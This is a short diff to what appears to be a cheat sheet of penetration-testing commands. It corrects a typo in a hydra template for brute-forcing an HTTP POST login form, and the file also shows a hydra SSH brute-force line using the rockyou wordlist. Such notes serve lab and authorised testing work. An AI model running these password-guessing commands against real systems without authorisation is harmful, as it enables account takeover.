@@ -5,5 +5,5 @@ commands:
 # brute force via ssh
 hydra -l <username> -P <wordlist e.g. /usr/share/wordlists/rockyou.txt> <ip address> -t 4 ssh
 # brute force via http post (here we assume that url is /login)
-hydra -l <username> -P /usr/share/wordlists/rockyou.txt <ip address> http-post-form "/login:username=^USER^&password=^P ASS^:F=incorrect"
+hydra -l <username> -P /usr/share/wordlists/rockyou.txt <ip address> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
 
